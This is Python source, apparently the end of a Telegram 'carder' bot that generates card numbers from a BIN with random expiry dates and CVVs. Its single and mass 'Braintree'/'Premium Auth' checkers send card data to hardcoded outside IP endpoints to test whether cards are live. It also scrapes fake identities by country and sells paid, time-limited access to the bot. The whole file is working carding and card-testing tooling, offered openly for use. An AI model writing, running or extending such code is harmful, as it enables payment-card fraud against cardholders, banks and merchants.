            mm = f"{random.randint(1, 12):02d}"
            yy = str(random.randint(2025, 2099))
            cvv = f"{random.randint(100, 999)}"

        if bin_part.isdigit() and len(bin_part) == 5:
            bin_part += str(random.randint(0, 9))

        if not all(c.isdigit() or c.lower() == 'x' for c in bin_part) or len(bin_part) < 6:
            bot.reply_to(message, "❌ Invalid BIN. Must be at least 6 digits or contain 'x'.")
            return

        cards = []
        for _ in range(10):
            card_number = generate_card(bin_part)
            cards.append(f"{card_number}|{mm}|{yy}|{cvv}")

        bin_info = fetch_bin_info(bin_part[:6])
        username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

        # Create the response with details at the bottom
        response = (
            f"💳 <b>Generated Credit Cards</b> 💳\n\n"
            f"📦 Cards generated:\n\n"
            + "\n".join(cards) + "\n\n"
            f"[ϟ] <b>BIN:</b> <code>{bin_part}</code>\n"
            f"[ϟ] <b>Country:</b> {bin_info['country']}\n"
            f"[ϟ] <b>Bank:</b> {bin_info['bank']}\n"
            f"[ϟ] <b>Brand:</b> {bin_info['brand']}\n"
            f"[ϟ] <b>Type:</b> {bin_info['type']}\n"
            f"[ϟ] <b>Scheme:</b> {bin_info['scheme']}\n"
            f"[ϟ] <b>Generated By:</b> {username}\n"
            f"[ϟ] <b>Amount:</b> 10 cards\n\n"
            "👑 Powered by: <b>@SLAYER_OP7</b>"
        )

        # Send the generated cards and details as a message
        bot.reply_to(message, response, parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, (
            f"⚠️ <b>Error:</b> {str(e)}\n\n"
            "📘 <b>Usage Guide</b>:\n"
            "Format 1: <code>/gen BIN|MM|YYYY|CVV</code>\n"
            "Example: <code>/gen 424242xxxxxx|12|2028|123</code>\n"
            "Format 2: <code>/gen BIN</code> (auto MM/YY/CVV)\n\n"
            "👑 Powered by: <b>@SLAYER_OP7</b>"
        ), parse_mode="HTML")

# Custom API URL for Braintree card checking
API_URL = "http://194.164.150.141:8099/key=darkk/cc="

# Function to check card using the custom Braintree API
def check_card(card_number):
    # Construct the URL with the card number
    url = f"{API_URL}{card_number}"
    
    try:
        # Make the HTTP GET request to the custom Braintree API
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()  # Assuming the API returns JSON data
            
            # Extract card details from the response
            return {
                "status": data.get("status", "Unknown"),
                "tok": card_number[:6],  # BIN (first 6 digits)
                "bank_name": data.get("bank_name", "N/A"),
                "card_type": data.get("card_type", "N/A"),
                "country_name": data.get("country_name", "N/A"),
                "country_flag": data.get("country_flag", "❌"),
            }
        else:
            return {
                "status": "Error",
                "tok": card_number[:6],
                "bank_name": "N/A",
                "card_type": "N/A",
                "country_name": "N/A",
                "country_flag": "❌",
            }
    except Exception as e:
        # Handle any errors during the request
        return {
            "status": "Error",
            "tok": card_number[:6],
            "bank_name": "N/A",
            "card_type": "N/A",
            "country_name": "N/A",
            "country_flag": "❌",
        }

# Function to get BIN details
def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Unknown Bank")
            card_type = data.get("type", "Unknown").capitalize()
            country = data.get("country", {}).get("name", "Unknown Country")
            country_emoji = data.get("country", {}).get("emoji", "🌍")
            return bank, card_type, country, country_emoji
        else:
            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
    except:
        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"

# Command handler for /b3
@bot.message_handler(commands=["b3"])
def handle_b3(message):
    user_input = message.text.split()[1:]  # Get user input (cards list after /b3 command)
    if not user_input:
        bot.reply_to(message, "Please provide a list of card numbers to check.")
        return
    
    # Start time tracking
    start_time = time.time()

    # Check cards one by one
    checked_cards = []
    for card in user_input:
        card_details = check_card(card.strip())
        
        # Extract details from card_details
        status = card_details["status"]
        bank_name = card_details["bank_name"]
        card_type = card_details["card_type"]
        country_name = card_details["country_name"]
        country_flag = card_details["country_flag"]
        tok = card_details["tok"]
        
        # Get response time
        response_time = round(time.time() - start_time, 2)

        # Build the response message using the provided format
        response = f"""
╭─━━━━━━━━━━━━━━━━━━━─╮
    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
╰─━━━━━━━━━━━━━━━━━━━─╯

📌 Card: <code>{card.strip()}</code>  
📌 Status: <code>{status}</code>
📌 Gateway: <code>Braintree Auth</code>
📌 BIN: <code>{tok}</code>
📌 Bank: <code>{bank_name}</code>
📌 Type: <code>{card_type}</code>
📌 Country: <code>{country_name} {country_flag}</code>
📌 Checked By: <code>{message.from_user.username if message.from_user else "Unknown"}</code>
📌 Response Time: <code>{response_time}s</code>

╭─━━━━━━━━━━━━━━━─╮
   𝗜𝗦𝗔𝗚𝗜 𝗕𝗢𝗧
╰─━━━━━━━━━━━━━━━─╯
        """
        checked_cards.append(response)
    
    # Send the results back to the user
    bot.reply_to(message, '\n'.join(checked_cards), parse_mode="HTML", disable_web_page_preview=True)


LOGS_GROUP_CHAT_ID = -1002576465941# Replace with your logs group chat ID
owners = {"6353114118", "6353114118"}  # Replace with actual owner IDs

@bot.message_handler(commands=["add"])
def add_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ Please provide a user ID and duration in days. Usage: /add <user_id> <days>")
        return
    
    user_id_to_add = parts[1]
    try:
        days = int(parts[2])
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid number of days. Please enter a valid integer.")
        return
    
    expire_time = time.time() + (days * 86400)
    with open("id.txt", "a") as file:
        file.write(f"{user_id_to_add}:{expire_time}\n")
    
    bot.send_message(user_id_to_add, f"✅ You have been authorized for {days} days. Expires on: {time.ctime(expire_time)}", parse_mode="HTML")
    log_message = (
        f"<b>✅ User Added</b>\n"
        f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
        f"🕒 <b>Expires on:</b> {time.ctime(expire_time)}"
    )
    bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
    bot.reply_to(message, f"✅ User {user_id_to_add} added successfully for {days} days.")

@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide a user ID to remove. Usage: /remove <user_id>")
        return
    
    user_id_to_remove = parts[1]
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        valid_lines = []
        user_removed = False
        for line in lines:
            line = line.strip()
            if not line:
                continue  # Skip empty lines
            
            parts = line.split(":")
            if len(parts) != 2:
                print(f"Skipping invalid entry: {line}")
                continue  # Skip malformed lines
            
            user, expire = parts
            if user == user_id_to_remove:
                user_removed = True
                bot.send_message(user_id_to_remove, "❌ Your access has expired, and you are no longer authorized.")
                continue  # Remove this user
            
            valid_lines.append(f"{user}:{expire}")
        
        with open("id.txt", "w") as file:
            file.write("\n".join(valid_lines) + "\n")
        
        if user_removed:
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
            bot.reply_to(message, f"✅ User {user_id_to_remove} removed successfully.")
        else:
            bot.reply_to(message, "⚠️ User not found in the authorized list.")
    
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Authorization file not found.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {e}")



# Define owners (replace with actual owner IDs)
owners = {"6353114118", "6353114118"}  # Example owner Telegram IDs

@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = str(message.chat.id)
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Get current time & day
    current_time = datetime.now().strftime("%I:%M %p")
    current_day = datetime.now().strftime("%A, %b %d, %Y")

    # Default status
    if user_id in owners:
        status = "👑 Owner 🛡️"
    else:
        status = "⛔ Not-Authorized ❌"

    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            for line in allowed_ids:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user, expire = parts
                    if user_id == user:
                        expiry_time = float(expire)
                        if expiry_time > time.time():
                            status = "✅ Authorized User"
                        else:
                            status = "❌ Access Expired"
                        break
    except FileNotFoundError:
        status = "⚠️ Authorization File Missing"

    response = f"""
<code>╭──────────────────────────
│ 🔍 𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾 🔥
╰──────────────────────────</code>

👤 <b>First Name:</b> {first_name}  
👤 <b>Last Name:</b> {last_name}  
🆔 <b>User ID:</b> <code>{user_id}</code>  
📛 <b>Username:</b> @{username}  
🔗 <b>Profile Link:</b> {profile_link}  
📋 <b>Status:</b> {status}  

<code>╭──────────────────────────
│ 🕒 𝚃𝙸𝙼𝙴 & 𝙳𝙰𝚃𝙴 📆
╰──────────────────────────</code>

🕒 <b>Time:</b> {current_time}  
📆 <b>Day:</b> {current_day}  

<code>╭──────────────────────────
│ 🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻 🔥
╰──────────────────────────</code>
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

    # Function to fetch fake identity details from fakexy.com based on country code
def get_fake_identity(country_code):
    url = f'http://fakexy.com/{country_code}'
    
    try:
        # Send the HTTP request to the website
        response = requests.get(url)
        response.raise_for_status()  # Will raise an error for bad responses

        # Parse the content with BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Assuming the identity details are in a specific format. Modify as needed.
        name = soup.find('span', {'class': 'name'}).text.strip()
        email = soup.find('span', {'class': 'email'}).text.strip()
        street = soup.find('span', {'class': 'street'}).text.strip()
        city = soup.find('span', {'class': 'city'}).text.strip()
        state = soup.find('span', {'class': 'state'}).text.strip()
        country = soup.find('span', {'class': 'country'}).text.strip()
        zip_code = soup.find('span', {'class': 'zip'}).text.strip()
        dob = soup.find('span', {'class': 'dob'}).text.strip()
        
        # Format the identity details
        identity = f"""
Random Identity Generated ✅

Name : {name}
Email : {email}
Street : {street}
City : {city}
State : {state}
Country : {country}
Zip code : {zip_code}
Date of Birth : {dob}

Powered By ➺ @SLAYER_OP7
"""
        return identity
    
    except requests.exceptions.RequestException as e:
        return f"Error fetching data: {e}"

# Command handler for /fake
@bot.message_handler(commands=['fake'])
def handle_fake(message):
    # Split the command to get the country code
    parts = message.text.split()
    
    if len(parts) != 2:
        bot.reply_to(message, "Please use the command in the format: /fake <country_code>")
        return
    
    country_code = parts[1].lower()  # e.g., "us", "ca", "uae"

    # Fetch the details for that country
    fake_identity = get_fake_identity(country_code)
    
    # Send the result back to the user
    bot.reply_to(message, fake_identity)

    # API endpoint for card checking
GATEWAY_URL = "http://147.93.105.138:1111/gate=str/key=wasdark/cc={}"

# Helper function to check a single card
def check_card(card_details):
    try:
        response = requests.get(GATEWAY_URL.format(card_details))
        data = response.json()
        status = data.get('status')
        card_result = data.get('message', 'Unknown error')
        brand = data.get('brand', 'Unknown')
        card_type = data.get('card_type', 'Unknown')
        bank = data.get('bank', 'Unknown')
        country = data.get('country', 'Unknown')
        return status, card_result, brand, card_type, bank, country
    except requests.exceptions.RequestException as e:
        return 'ERROR', f'Failed to check card: {str(e)}', '', '', '', ''

# Command handler for /chk (single card check)
@bot.message_handler(commands=['chk'])
def check(message):
    # Get the card from the user (expecting the format: CC|MM|YYYY|CVV)
    card_input = message.text.split(" ")[1:]  # Skips the command part
    
    if len(card_input) == 0:
        bot.reply_to(message, "Please provide a card in the format: CC|MM|YYYY|CVV.")
        return
    
    card_details = card_input[0]
    
    # Check the card
    status, card_result, brand, card_type, bank, country = check_card(card_details)

    if status == 'ERROR':
        response_message = f"""
#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: `{card_details}`
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: ⚠️ Error - {card_result}
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐈𝐧𝐟𝐨: Unknown
[ϟ] 𝐁𝐚𝐧𝐤: Unknown
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: Unknown
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐓𝐢𝐦𝐞: {round(time.time() - message.date, 2)} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: Unknown
[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @SLAYER_OP7 🚀
"""
    else:
        response_message = f"""
#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: `{card_details}`
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐑𝐞𝐬𝐮𝐥𝐭: {card_result}
[ϟ] 𝐕𝐁𝐕 𝐒𝐭𝐚𝐭𝐮𝐬: {card_result}  # Adjust this based on your response data
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐓𝐢𝐦𝐞: {round(time.time() - message.date, 2)} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: Unknown
[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @SLAYER_OP7 🚀
"""

    # Send the response back to the user
    bot.reply_to(message, response_message)


# Command handler for /mchk (mass card check)
@bot.message_handler(commands=['mchk'])
def mass_check(message):
    # Get the list of cards from the user (expecting format: CC|MM|YYYY|CVV for each card)
    card_input = message.text.split("\n")[1:]  # Skips the command part
    
    if len(card_input) == 0:
        bot.reply_to(message, "Please provide cards in the format: CC|MM|YYYY|CVV (one card per line).")
        return
    
    # Initialize counters
    total = len(card_input)
    checked = 0
    approved = 0
    declined = 0
    errors = 0
    response_list = []
    start_time = time.time()

    for card_details in card_input:
        card_details = card_details.strip()
        if not card_details:
            continue

        status, card_result, brand, card_type, bank, country = check_card(card_details)
        
        if status == 'ERROR':
            errors += 1
            response_list.append(f"{card_details} | Status: ❌ Error - {card_result}")
            declined += 1
        else:
            checked += 1
            result = "✅ Approved" if 'approved' in card_result.lower() else "❌ Declined"
            if result == "✅ Approved":
                approved += 1
            response_list.append(f"{card_details} | Status: {result}")
            if result == "❌ Declined":
                declined += 1

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # Formatting the mass check summary
    mass_check_summary = f"""
┌───────────────
│  ✧ Total: {total}
│  ✧ Checked: {checked}/{total}
│ ✅ Approved: {approved}
│ 🟡 CCN: {approved}
│ ❌ Declined: {declined}
│ ⚠️ Errors: {errors}
│ ⏱️ Time: {time_taken} S
└───────────────

Mass Check
─━─━─━─━─━─━─━─━─━─
"""
    # Add individual results for each card
    for result in response_list:
        mass_check_summary += f"{result}\n─━─━─━─━─━─━─━─━─━─\n"

    # Send the mass check summary
    bot.reply_to(message, mass_check_summary)


def is_bot_stopped():
    return os.path.exists("stop.stop")

# Start the bot
bot.polling()
